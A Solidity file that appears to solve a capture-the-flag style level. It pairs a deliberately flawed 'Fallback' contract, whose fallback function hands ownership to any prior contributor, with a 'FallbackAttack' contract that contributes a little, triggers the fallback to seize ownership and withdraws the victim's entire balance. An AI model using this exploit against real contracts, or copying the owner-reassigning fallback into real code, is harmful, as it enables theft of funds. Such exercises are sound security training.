pragma solidity ^0.4.24;

import './Ownable.sol';

contract Fallback is Ownable {

  mapping(address => uint) public contributions;

  function Fallback() public {
    contributions[msg.sender] = 1000 * (1 ether);
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(this.balance);
  }

  function() payable public {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

contract FallbackAttack {

    Fallback victim;

    constructor(address _victim) public {
        victim = Fallback(_victim);
    }

    function() external payable { } //if need to receive ether

    function attack() external payable returns(bool success) {
        require(msg.value >= 900000000000042 wei);
        victim.contribute.value(0.0009 ether)();
        if (address(victim).call.value(42 wei)()) {
            return true;
        }
    }

    function withdrawBalance() external returns(uint256 localBalance, uint256 remoteBalance) {
        victim.withdraw();
        return (address(this).balance, address(victim).balance); //victim should be zero
    }

}
